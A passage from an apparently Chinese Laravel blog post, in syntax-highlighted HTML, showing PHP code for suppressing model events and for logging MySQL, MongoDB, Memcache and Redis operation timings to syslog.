Visitor::where(<span class="string">'id'</span>, $request-&gt;visitor_id)-&gt;first();</span><br><span class="line"><span class="comment">//取消事件触发https://learnku.com/articles/31490</span></span><br><span class="line">$dispatcher = Visitor::getEventDispatcher();</span><br><span class="line">Visitor::unsetEventDispatcher();</span><br><span class="line">$ret = $visitor-&gt;save();</span><br><span class="line">Visitor::setEventDispatcher($dispatcher);</span><br><span class="line"><span class="comment">//5.7</span></span><br><span class="line">YourModel::withoutEvents(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="comment">// do something...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="记录memcache-mongodb运行时间"><a href="#记录memcache-mongodb运行时间" class="headerlink" title="记录memcache mongodb运行时间"></a>记录memcache mongodb运行时间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">cache   \vendor\laravel\framework\src\Illuminate\Cache\Repository.php</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Store $store</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">		$<span class="keyword">this</span>-&gt;store = $store;</span><br><span class="line">	&#125;</span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">fireCacheEvent</span>(<span class="params">$event, $payload</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 添加cache响应时间</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $total = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">        $payload[] = $total;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;events))</span><br><span class="line">		&#123;</span><br><span class="line">			$<span class="keyword">this</span>-&gt;events-&gt;fire(<span class="string">'cache.'</span>.$event, $payload);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">$key, $value, $minutes</span>)</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    		$minutes = $<span class="keyword">this</span>-&gt;getMinutes($minutes);</span><br><span class="line">    </span><br><span class="line">    		<span class="keyword">if</span> ( ! is_null($minutes))</span><br><span class="line">    		&#123;</span><br><span class="line">    			$<span class="keyword">this</span>-&gt;store-&gt;put($key, $value, $minutes);</span><br><span class="line">    </span><br><span class="line">    			$<span class="keyword">this</span>-&gt;fireCacheEvent(<span class="string">'write'</span>, [$key, $value, $minutes]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">vendor\laravel\framework\src\Illuminate\Database\Eloquent\Model.php</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">array $attributes = array(</span>))</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_time_cost_start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;bootIfNotBooted();</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;syncOriginal();</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;fill($attributes);</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">array $options = array(</span>))</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    	    <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;_time_cost_start = microtime(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">  *<span class="regexp">/</span></span><br><span class="line"><span class="regexp"> 	protected function performInsert(Builder $query, array $options = [])</span></span><br><span class="line"><span class="regexp"> 	&#123;</span></span><br><span class="line"><span class="regexp"> 		if ($this-&gt;fireModelEvent('creating') === false) return false;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> 		if ($this-&gt;timestamps &amp;&amp; array_get($options, 'timestamps', true))</span></span><br><span class="line"><span class="regexp"> 		&#123;</span></span><br><span class="line"><span class="regexp"> 			$this-&gt;updateTimestamps();</span></span><br><span class="line"><span class="regexp"> 		&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> 		$attributes = $this-&gt;attributes;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">         $conn = $query-&gt;getModel()-&gt;connection;</span></span><br><span class="line"><span class="regexp">         if($conn == "mongodb") &#123;</span></span><br><span class="line"><span class="regexp">             unset($attributes['_time_cost_start']);</span></span><br><span class="line"><span class="regexp">             unset($attributes['_time_cost_total']);</span></span><br><span class="line"><span class="regexp">         &#125;</span></span><br><span class="line"><span class="regexp">protected function fireModelEvent($event, $halt = true)</span></span><br><span class="line"><span class="regexp">	&#123;</span></span><br><span class="line"><span class="regexp">		if ( ! isset(static::$dispatcher)) return true;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        /</span>**</span><br><span class="line">         * 将监听事件类名去掉，去掉<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">         * 添加<span class="title">mongodb</span>响应时间</span></span><br><span class="line"><span class="class">         */</span></span><br><span class="line"><span class="class">		//$<span class="title">event</span> </span>= <span class="string">"eloquent.&#123;$event&#125;: "</span>.get_class($<span class="keyword">this</span>);</span><br><span class="line">        $event = <span class="string">"eloquent.&#123;$event&#125;"</span>;</span><br><span class="line">		$method = $halt ? <span class="string">'until'</span> : <span class="string">'fire'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_time_cost_total = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;_time_cost_start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::$dispatcher-&gt;$method($event, $<span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Mysql event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'illuminate.query'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$sql, $binds, $time,$name</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::HandleMysqlSysLog($sql, $binds, $time, $name, $app);</span><br><span class="line">           &#125;);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//MongoDB event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'eloquent.saved'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$model</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MongodbSysLog(<span class="string">'saved'</span>, $app, $model);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'eloquent.deleted'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$model</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MongodbSysLog(<span class="string">'deleted'</span>, $app, $model);</span><br><span class="line">           &#125;);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//Memcache event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.write'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $value, $time, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'put'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.delete'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'delete'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.hit'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $value, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'get'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.missed'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'missed'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           </span><br><span class="line">  public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MysqlSysLog</span>(<span class="params">$sql, $binds, $time, $name, $app</span>)</span>&#123;</span><br><span class="line">          foreach ($binds <span class="keyword">as</span> $bind) &#123;</span><br><span class="line">              $sql = preg_replace(<span class="string">'/\?/'</span>, <span class="string">'\''</span> . $bind . <span class="string">'\''</span>, $sql, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//调用select时先判断使用读库还是写库，而insert/update/delete统一使用写库 Illuminate/Database/Connectors/ConnectionFactory.php Illuminate/Database/Connection.php</span></span><br><span class="line">          $connection = $app[<span class="string">'db'</span>]-&gt;getconnections();</span><br><span class="line">          <span class="keyword">if</span> ($name) &#123;</span><br><span class="line">              <span class="keyword">if</span> (preg_match(<span class="string">'#^select[\s\S]*$#'</span>, $sql, $match)) &#123;</span><br><span class="line">                  $pdo = $connection[$name]-&gt;getreadPdo();</span><br><span class="line">                  $host = explode(<span class="string">' '</span>, $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[<span class="number">0</span>]; </span><br><span class="line">                  $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  $pdo = $connection[$name]-&gt;getpdo();</span><br><span class="line">                  $host = explode(<span class="string">' '</span>, $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[<span class="number">0</span>];</span><br><span class="line">                  $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO);</span><br><span class="line">              &#125;</span><br><span class="line">  </span><br><span class="line">              $data = [</span><br><span class="line">                  <span class="string">'rs'</span> =&gt; <span class="string">'mysql://'</span> . $host.<span class="string">':'</span>.$connection[$name]-&gt;getconfig(<span class="string">'port'</span>) . <span class="string">'/'</span> . $connection[$name]-&gt;getconfig(<span class="string">'name'</span>),</span><br><span class="line">                   <span class="string">'cmd'</span> =&gt; $sql,</span><br><span class="line">                  <span class="string">'output_content'</span> =&gt; [</span><br><span class="line">                      <span class="string">'database'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'database'</span>),</span><br><span class="line">                      <span class="string">'host'</span> =&gt; $host,</span><br><span class="line">                      <span class="string">'name'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'name'</span>),</span><br><span class="line">                      <span class="string">'port'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'port'</span>),</span><br><span class="line">                      <span class="string">'driver'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'driver'</span>),</span><br><span class="line">                      <span class="string">'server_info'</span> =&gt; $server_info</span><br><span class="line">                  ],</span><br><span class="line">                  <span class="string">'t_total'</span> =&gt; $time</span><br><span class="line">              ]; </span><br><span class="line">              self::SaveSysLog($data);</span><br><span class="line">          &#125; </span><br><span class="line">      &#125;         </span><br><span class="line">      public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MemcacheSysLog</span>(<span class="params">$cmd, $key, $total</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">if</span>(app(<span class="string">'cache'</span>)-&gt;getStore() <span class="keyword">instanceof</span> \Illuminate\Cache\MemcachedStore)&#123;</span><br><span class="line">                  $servers = implode(<span class="string">'/'</span>, array_keys(app(<span class="string">'cache'</span>)-&gt;getMemcached()-&gt;getStats()));</span><br><span class="line">                  $data = [</span><br><span class="line">                      <span class="string">'rs'</span> =&gt; <span class="string">'mc://'</span> . $servers,</span><br><span class="line">                       <span class="string">'cmd'</span> =&gt; $cmd . <span class="string">' '</span> . $key,</span><br><span class="line">                      <span class="string">'t_total'</span> =&gt; $total,</span><br><span class="line">                      <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                  ];</span><br><span class="line">              &#125;  </span><br><span class="line">       self::SaveSysLog($data);</span><br><span class="line">           &#125;     </span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MongodbSysLog</span>(<span class="params">$cmd, $app, $model</span>)</span>&#123;</span><br><span class="line">            $connection = $app[<span class="string">'db'</span>]-&gt;getconnections();</span><br><span class="line">            <span class="keyword">if</span>(isset($connection[<span class="string">'mongodb'</span>])) &#123;</span><br><span class="line">                $data = [</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; <span class="string">'Mongo://'</span> . $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'host'</span>) . <span class="string">':'</span> . $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'port'</span>) ,</span><br><span class="line">                     <span class="string">'cmd'</span> =&gt; $cmd,</span><br><span class="line">                    <span class="string">'output_content'</span> =&gt; [</span><br><span class="line">                        <span class="string">'database'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'database'</span>),</span><br><span class="line">                        <span class="string">'host'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'host'</span>),</span><br><span class="line">                        <span class="string">'port'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'port'</span>),</span><br><span class="line">                        <span class="string">'driver'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'driver'</span>)</span><br><span class="line">                    ],</span><br><span class="line">                    <span class="string">'t_total'</span> =&gt; $model-&gt;_time_cost_total,</span><br><span class="line">                    <span class="string">'rs_content'</span> =&gt; $model-&gt;toArray()[<span class="string">'_id'</span>]</span><br><span class="line">                ];</span><br><span class="line">            &#125;  </span><br><span class="line">            </span><br><span class="line">            self::SaveSysLog($data);</span><br><span class="line">        &#125;   </span><br><span class="line">        public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">SaveSysLog</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(php_sapi_name()==<span class="string">'cli'</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                 openlog(<span class="string">'app'</span>,LOG_PID|LOG_ODELAY,LOG_LOCAL6);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    syslog(LOG_INFO,json_encode($data));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">                    \Log::info(<span class="string">'syslog_error'</span>, [<span class="string">'data'</span> =&gt; $data]);</span><br><span class="line">                &#125;</span><br><span class="line">                closelog();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">vendor/laravel/framework/src/Illuminate/Cache/MemcachedStore.php:<span class="number">164</span>            </span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">		$value = $<span class="keyword">this</span>-&gt;memcached-&gt;get($<span class="keyword">this</span>-&gt;prefix.$key);</span><br><span class="line">        <span class="comment">//$total = round((microtime(true) - $this-&gt;start) * 1000, 2);</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;end = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;handleMcSysLog(<span class="string">'get'</span>, $key);</span><br><span class="line">		<span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;memcached-&gt;getResultCode() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> $value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;            </span><br><span class="line">            </span><br><span class="line">     private <span class="function"><span class="keyword">function</span> <span class="title">handleMcSysLog</span>(<span class="params">$cmd, $key</span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             $total = round(($<span class="keyword">this</span>-&gt;end - $<span class="keyword">this</span>-&gt;start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">             $rs = implode(<span class="string">'/'</span>, array_keys($<span class="keyword">this</span>-&gt;memcached-&gt;getStats()));</span><br><span class="line">             $data = [</span><br><span class="line">                 <span class="string">'rs'</span> =&gt; <span class="string">'mc://'</span> . $rs,</span><br><span class="line">                 <span class="string">'rs_type'</span> =&gt; <span class="number">6</span>,</span><br><span class="line">                 <span class="string">'cmd'</span> =&gt; $cmd . <span class="string">' '</span> . $key,</span><br><span class="line">                 <span class="string">'t_total'</span> =&gt; $total,</span><br><span class="line">                 <span class="string">'code'</span> =&gt; $<span class="keyword">this</span>-&gt;memcached-&gt;getLastErrorCode(),</span><br><span class="line">                 <span class="string">'ext'</span> =&gt; $<span class="keyword">this</span>-&gt;memcached-&gt;getLastErrorMessage()</span><br><span class="line">             ];</span><br><span class="line">             </span><br><span class="line">     </span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录Redis运行时间"><a href="#记录Redis运行时间" class="headerlink" title="记录Redis运行时间"></a>记录Redis运行时间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">predis</span><br><span class="line"></span><br><span class="line">use \Predis\Command\CommandInterface;</span><br><span class="line">use \Predis\Connection\StreamConnection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLog</span> <span class="keyword">extends</span> <span class="title">StreamConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $tstart = <span class="number">0</span>;</span><br><span class="line">    private $debugBuffer = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        parent::connect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">storeDebug</span>(<span class="params">CommandInterface $command, $direction</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $firtsArg = $command-&gt;getArguments();</span><br><span class="line">        $timestamp = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;tstart) * <span class="number">1000</span>,<span class="number">2</span>);</span><br><span class="line">        $log = [];</span><br><span class="line">        $log[<span class="string">'cmd'</span>] = $command-&gt;getId();</span><br><span class="line">        $log[<span class="string">'key'</span>] = isset($firtsArg) ?  $firtsArg  : <span class="string">' '</span>;</span><br><span class="line">        $log[<span class="string">'server'</span>] = <span class="string">"$direction $this"</span>;</span><br><span class="line">        $log[<span class="string">'time'</span>] = $timestamp;</span><br><span class="line">        dump([<span class="string">'rs'</span> =&gt; <span class="string">'redis://'</span> . trim($log[<span class="string">'server'</span>]), <span class="string">'cmd'</span> =&gt; $command-&gt;getId(),   <span class="string">'t_total'</span> =&gt; $timestamp]);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        $this-&gt;debugBuffer[] = &amp;$log;</span></span><br><span class="line">        unset($log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">writeRequest</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);<span class="comment">//执行命令行的时候重新算 这样就不会叠加</span></span><br><span class="line">        parent::writeRequest($command);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        $this-&gt;storeDebug($command, '-&gt;');</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">readResponse</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = parent::readResponse($command);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;storeDebug($command, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDebugBuffer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;debugBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = array(</span><br><span class="line">            <span class="string">'connections'</span> =&gt;[</span><br><span class="line">                <span class="string">'tcp'</span> =&gt; <span class="string">'\App\Services\RedisLog'</span>,</span><br><span class="line">            ],</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $client = <span class="keyword">new</span> \Predis\Client(config(<span class="string">'database.redis'</span>), $options);</span><br><span class="line">        $client-&gt;get(<span class="string">'redis:test'</span>);</span><br><span class="line"></span><br><span class="line">        var_export($client-&gt;getConnection());</span><br><span class="line">        <span class="comment">/* OUTPUT:</span></span><br><span class="line"><span class="comment">        array (</span></span><br><span class="line"><span class="comment">          0 =&gt; 'SELECT 15 -&gt; 127.0.0.1:6379 [0.0008s]',</span></span><br><span class="line"><span class="comment">          1 =&gt; 'SELECT 15 &lt;- 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          2 =&gt; 'SET foo -&gt; 127.0.0.1:6379 